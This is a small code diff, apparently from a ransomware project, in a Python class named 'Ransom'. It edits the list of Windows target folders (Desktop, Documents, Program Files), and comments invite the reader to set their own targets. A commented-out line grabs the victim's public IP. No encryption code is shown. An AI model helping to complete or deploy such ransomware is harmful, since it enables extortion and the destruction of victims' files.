@@ -16,9 +16,9 @@ class Ransom:
     windows_paths = {
         "test" : f"E://testes/ransom",  # remove this after and replace with whatever you want
         "pathuwant" : "location",  # remove this after and replace with whatever you want
-        "example" : f"D://{user_path}/Desktop",  # remove this after and replace with whatever you want
-        "example2": f"D://{user_path}/Documents",  # remove this after and replace with whatever you want
-        "example3": f"D://Program Files"  # remove this after and replace with whatever you want
+        "example" : f"D:/{user_path}/Desktop",  # remove this after and replace with whatever you want
+        "example2": f"D:/{user_path}/Documents",  # remove this after and replace with whatever you want
+        "example3": f"D:/Program Files"  # remove this after and replace with whatever you want
                     }
     #self.publicIP = requests.get('https://api.ipify.org').text  api for ip grabber
 
